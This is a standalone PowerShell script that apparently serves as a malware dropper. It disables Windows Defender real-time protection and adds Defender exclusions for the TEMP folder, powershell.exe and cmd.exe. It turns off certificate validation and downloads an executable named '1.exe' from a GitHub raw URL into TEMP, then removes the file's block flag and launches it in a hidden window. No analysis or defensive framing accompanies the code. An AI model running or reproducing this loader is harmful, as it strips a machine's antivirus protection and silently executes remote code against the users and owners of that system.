Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
$exePath = "$env:TEMP\1.exe"
$url = "https://github.com/socialhate/Test/raw/refs/heads/main/1.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$webclient = New-Object Net.WebClient
$webclient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$webclient.DownloadFile($url, $exePath)
Unblock-File -Path $exePath -ErrorAction SilentlyContinue
Start-Process -FilePath $exePath -WindowStyle Hidden
Exit
